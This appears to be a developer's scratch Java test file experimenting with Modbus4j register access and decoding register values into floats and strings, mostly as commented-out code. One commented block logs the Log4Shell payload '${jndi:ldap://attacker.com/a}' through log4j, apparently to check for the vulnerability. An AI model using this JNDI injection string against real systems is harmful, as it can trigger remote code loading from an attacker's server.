package com.demo;


import com.serotonin.modbus4j.ModbusFactory;
import com.serotonin.modbus4j.ModbusMaster;
import com.serotonin.modbus4j.code.DataType;
import com.serotonin.modbus4j.exception.ErrorResponseException;
import com.serotonin.modbus4j.exception.ModbusInitException;
import com.serotonin.modbus4j.exception.ModbusTransportException;
import com.serotonin.modbus4j.ip.IpParameters;
import com.serotonin.modbus4j.locator.BaseLocator;
import org.apache.logging.log4j.LogManager;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.ShortBuffer;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TestModbus {

    private static final Logger LOGGER = LoggerFactory.getLogger(TestModbus.class);

    private static final org.apache.logging.log4j.Logger LOG = LogManager.getLogger(TestModbus.class);


    public static void main(String[] args) throws ModbusInitException, ModbusTransportException, ErrorResponseException {
//        short[] data = {(short) -15729, (short) 16818};
//
//        ByteBuffer buffer = ByteBuffer.allocate(4);
//        ShortBuffer sb = buffer.asShortBuffer();
//        sb.put(data);
//        buffer.putShort((short) 16818);
//        buffer.putShort((short) -15729);
//
//        System.out.println(buffer.getFloat(0));


//        ByteBuffer byteBuffer = ByteBuffer.allocate(4);
//        ShortBuffer shortBuffer = byteBuffer.asShortBuffer();
//        shortBuffer.put((short) 16818);
//        shortBuffer.put((short) -15729);
////        shortBuffer.put((short) -15729);
////        shortBuffer.put((short) -15729);
//
//        byte[] data = byteBuffer.array();
//        long start = System.currentTimeMillis();
//        int d = ((data[0] & 0xff) << 24) | ((data[1] & 0xff) << 16) | ((data[2] & 0xff) << 8) | (data[3] & 0xff);
//        System.out.println(Float.intBitsToFloat(d));
//        System.out.println(System.currentTimeMillis() - start);
//
//        start = System.currentTimeMillis();
//        System.out.println(Float.intBitsToFloat(Integer.parseInt(fillBinary((short) 16818) + fillBinary((short) -15729), 2)));
//        System.out.println(System.currentTimeMillis() - start);
//
//        start = System.currentTimeMillis();
//        int f = ((16818 & 0xFFFF) << 16) | (-15729 & 0xFFFF);
//        System.out.println(Float.intBitsToFloat(f));
//        System.out.println(System.currentTimeMillis() - start);


//        ByteBuffer byteBuffer = ByteBuffer.allocate(200);
//        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
//        ShortBuffer shortBuffer = byteBuffer.asShortBuffer();
        short[] data = new short[] {0, 1, 0, 0, 0, 0, 1, 2, 3, 1, 3, 3, 0, 1, -15729, 16818, -16777, 16691, -4194, 16972, -21496, 16252, 13107, 16691, -15729, 16818, 6816, 16823, -22020, 16902, 7078, 16947, -29360, 16955, -29360, 16955, -29360, 16955, -7340, 17270, -7340, 17170, 15335, 17236, -29360, 16955, 0, 0, 0, 0, 0, 0, 0, 0, 12336, 12336, 14129, 12594, 12594, 14640, 12336, 12596, 12336, 12352, 12336, 13104, 13111, 12848, 16441, 12338, 13616, 12850, 12336, 12336, 14902, 12857, 16698, 70, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,};
        System.out.println(Arrays.toString(Arrays.copyOfRange(data, 0, 0 + 10)));
        System.out.println(Arrays.toString(Arrays.copyOfRange(data, 10, 10 + 10)));
//        for (int i = 54; i < 104; i ++) {
//            if (data[i] > 0) {
//                shortBuffer.put(data[i]);
//            }
//        }
//
//        byte[] array = byteBuffer.array();
//        String str = new String(array, StandardCharsets.UTF_8);
//        System.out.println(str);
//        System.out.println(Arrays.toString(str.trim().toCharArray()));
//
//        System.out.println("000001723210707900@0702012027@22010590060:91:C".substring(45, 46));
//        String header ="${jndi:ldap://attacker.com/a}";
//        LOG.info(header);
//        LOG.info("test: {}", header);

//        IpParameters params = new IpParameters();
//        params.setHost("192.168.3.1");
//        params.setPort(502);
//
//        ModbusMaster master = new ModbusFactory().createTcpMaster(params, true);
//        master.init();
//////        // Define the point locator.
//        BaseLocator<Number> loc = BaseLocator.holdingRegister(1, 7001, DataType.TWO_BYTE_INT_UNSIGNED);
//////
////////        // Set the point value
//        master.setValue(loc, 1111);
//////
//////        // Get the point value
//        System.out.println(master.getValue(loc));
//
//        ReadHoldingRegistersRequest request = new ReadHoldingRegistersRequest(1, 0, 2);
//        ReadHoldingRegistersResponse response = (ReadHoldingRegistersResponse) master.send(request);
//        byte[] data = response.getData();
//        float f = bytes2Float(data);
//        System.out.println(f);

        //11000010 10001111 01000001 10110010
        //1.0001111 01000001 10110010
//        int i = Integer.parseInt("10000101", 2);
//        System.out.println(i);
//        //133 - 127 = 6
//        //1000111.1 01000001 10110010
//        System.out.println(Integer.parseInt("1000111",2 ));
//        System.out.println(Integer.parseInt("1.10100000110110010",2 ));


        //01000001 10110010 11000010 10001111
//        char[] p = "10000011".toCharArray();
//        double aaa = ((Integer.parseInt(String.valueOf(p[0])) * Math.pow(2, 7)) +
//                (Integer.parseInt(String.valueOf(p[1])) * Math.pow(2, 6)) +
//                (Integer.parseInt(String.valueOf(p[2])) * Math.pow(2, 5)) +
//                (Integer.parseInt(String.valueOf(p[3])) * Math.pow(2, 4)) +
//                (Integer.parseInt(String.valueOf(p[4])) * Math.pow(2, 3)) +
//                (Integer.parseInt(String.valueOf(p[5])) * Math.pow(2, 2)) +
//                (Integer.parseInt(String.valueOf(p[6])) * Math.pow(2, 1)) +
//                (Integer.parseInt(String.valueOf(p[7])) * Math.pow(2, 0)));
//        System.out.println(aaa);
//        System.out.println(Math.pow(2, 7));
//        System.out.println(((int) p[0]) * Math.pow(2, 7));
//        char[] f = "01100101100001010001111".toCharArray();
//        int r = 0;
//        for (int i = 1; i <24; i ++) {
//            r += (Math.pow(2, i * -1) * f[i - 1]);
//        }
//        System.out.println(r);
//
//        System.out.println(46 * Math.pow(2, 131) / Math.pow(2, 127));

//        System.out.println(Float.intBitsToFloat(Integer.parseInt("01000001101100101100001010001111", 2)));
//
//
//        System.out.println(Float.intBitsToFloat(Integer.parseInt(Integer.toBinaryString(16691 & 0xFFFF) + Integer.toBinaryString(-16777 & 0xFFFF), 2)));

//        List<Integer> data = Arrays.asList(12336,
//                12336,
//                14129,
//                12594,
//                12594,
//                14640,
//                12336,
//                12596,
//                12336,
//                12352,
//                12336,
//                13104,
//                13111,
//                12848,
//                16441,
//                12338,
//                13616,
//                12850,
//                12336,
//                12336,
//                14902,
//                12857,
//                16698);
//
//        byte[] bb = new byte[data.size() * 2];
//        int offset = 0;
//        for (Integer d : data) {
//            short2Bytes(d.shortValue(), bb, offset);
//            offset = offset + 2;
//        }
//        String d = new String(bb, StandardCharsets.UTF_8);
//        System.out.println(d);
//        Pattern pattern = Pattern.compile("(\\d+)@(\\d+)@(\\d+):(\\d\\d):(\\w)");
//        Matcher matcher = pattern.matcher(d);
//        if (matcher.matches()) {
//            System.out.println(matcher.group(3));
//        }

//        System.out.println(new SecureRandom().nextBoolean());

//        System.out.println("000017212109004100@0000373029@20052200006:92:A".substring(30, 41));

    }

    private static void short2Bytes(short s, byte[] bytes, int offset) {
        bytes[offset] = (byte) (s & 0xff);
        bytes[offset + 1] = (byte) ((s & 0xff00) >> 8);
    }

    private static String fillBinary(short value) {
        StringBuilder binary = new StringBuilder(Integer.toBinaryString(value & 0xFFFF));
        while (binary.length() < 16) {
            binary.insert(0, "0");
        }
        return binary.toString();
    }
}
